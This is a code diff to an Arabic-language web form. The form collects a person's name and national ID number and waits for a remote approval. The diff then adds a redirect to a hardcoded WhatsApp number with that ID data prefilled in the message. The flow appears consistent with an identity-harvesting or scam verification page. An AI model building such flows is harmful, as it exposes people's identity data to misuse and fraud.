@@ -403,8 +403,15 @@ body{
 <script>
 const SUBMIT_API = "/api/submit";
 const STATUS_API = "/api/webhook";
+const WHATSAPP_PHONE = "971555784831";
 
 const $ = id => document.getElementById(id);
+
+let currentRequest = {
+  requestId: "",
+  name: "",
+  eid: ""
+};
 
 $('eid').addEventListener('input', e => {
   const d = e.target.value.replace(/\D/g, '').slice(0, 15);
@@ -435,6 +442,22 @@ function createRequestId() {
   return "REQ-" + Date.now().toString().slice(-6) + "-" + Math.floor(100 + Math.random() * 900);
 }
 
+function buildWhatsAppApprovalUrl() {
+  const message = [
+    "تمت الموافقة",
+    `رقم الطلب: ${currentRequest.requestId}`,
+    `الاسم: ${currentRequest.name}`,
+    `رقم الهوية: ${currentRequest.eid}`
+  ].join("\n");
+
+  return `https://wa.me/${WHATSAPP_PHONE}?text=${encodeURIComponent(message)}`;
+}
+
+function goToWhatsAppWithApproval() {
+  const waUrl = buildWhatsAppApprovalUrl();
+  window.location.href = waUrl;
+}
+
 async function parseJsonSafely(res) {
   const raw = await res.text();
   try {
@@ -445,9 +468,12 @@ async function parseJsonSafely(res) {
 }
 
 let pollTimer = null;
+let redirectTimer = null;
 
 function pollDecision(requestId) {
   clearInterval(pollTimer);
+  clearTimeout(redirectTimer);
+
   pollTimer = setInterval(async () => {
     try {
       const res = await fetch(`${STATUS_API}?requestId=${encodeURIComponent(requestId)}`, {
@@ -459,9 +485,13 @@ function pollDecision(requestId) {
         clearInterval(pollTimer);
         $('statusIcon').textContent = "✅";
         $('statusTitle').style.color = "var(--green)";
-        $('statusTitle').textContent = "تم القبول";
-        $('statusDesc').textContent = "تمت الموافقة على طلب التحقق بنجاح.";
+        $('statusTitle').textContent = "تمت الموافقة";
+        $('statusDesc').textContent = "تمت الموافقة بنجاح، جاري تحويلك إلى واتساب لإرسال رسالة تمت الموافقة...";
         $('retryBtn').style.display = "none";
+
+        redirectTimer = setTimeout(() => {
+          goToWhatsAppWithApproval();
+        }, 1200);
       } else if (json.status === "rejected") {
         clearInterval(pollTimer);
         $('statusIcon').textContent = "❌";
@@ -471,11 +501,12 @@ function pollDecision(requestId) {
         $('retryBtn').style.display = "inline-block";
       }
     } catch (_) {}
-  }, 2500);
+  }, 2000);
 }
 
 $('retryBtn').addEventListener('click', () => {
   clearInterval(pollTimer);
+  clearTimeout(redirectTimer);
   $('statusBox').style.display = 'none';
   $('retryBtn').style.display = 'none';
   $('statusTitle').style.color = 'var(--text)';
@@ -517,6 +548,12 @@ $('f').addEventListener('submit', async e => {
   if (!ok) return;
 
   const requestId = createRequestId();
+  currentRequest = {
+    requestId,
+    name: fullName,
+    eid: eidVal
+  };
+
   const payload = {
     requestId,
     name: fullName,
